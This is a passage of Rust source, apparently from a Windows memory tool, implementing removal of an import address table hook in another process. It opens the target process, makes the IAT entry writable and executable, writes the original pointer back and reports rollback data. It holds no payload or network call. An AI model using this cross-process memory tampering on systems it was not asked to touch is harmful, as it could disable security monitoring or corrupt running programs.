    use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_EXECUTE_READWRITE};
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
        PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let iat_address = args
        .get("iat_address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::InjectionFailed("Missing iat_address".to_string()))?;
    let original_address = args
        .get("original_address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::InjectionFailed("Missing original_address".to_string()))?;

    tracing::info!("Unhooking IAT: PID {} IAT 0x{:016X}", pid, iat_address);

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let mut replaced_address = 0u64;
        let mut replaced_address_capture = None;
        if ReadProcessMemory(
            *handle,
            iat_address as *const _,
            &mut replaced_address as *mut _ as *mut _,
            8,
            None,
        )
        .is_ok()
        {
            replaced_address_capture = Some(replaced_address);
        }

        // Change IAT protection to RW
        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle,
            iat_address as *mut _,
            8,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Failed to change protection: {}", e))
        })?;

        // Write original address back
        WriteProcessMemory(
            *handle,
            iat_address as *mut _,
            &original_address as *const u64 as *const _,
            8,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to restore IAT: {}", e)))?;

        // Restore protection
        let _ = VirtualProtectEx(
            *handle,
            iat_address as *mut _,
            8,
            old_protect,
            &mut old_protect,
        );

        Ok(serde_json::json!({
            "success": true,
            "message": "IAT hook removed successfully",
            "pid": pid,
            "iat_address": crate::memory::rollback::format_address(iat_address),
            "original_address": crate::memory::rollback::format_address(original_address),
            "replaced_address": replaced_address_capture
                .map(crate::memory::rollback::format_address)
                .map(serde_json::Value::String)
                .unwrap_or(Value::Null),
            "old_protect": old_protect.0,
            "rollback": restore_removed_iat_hook_pointer_rollback(
                pid,
                iat_address,
                original_address,
                replaced_address_capture,
            ),
            "provenance": provenance_json(args)
        }))
    }
}
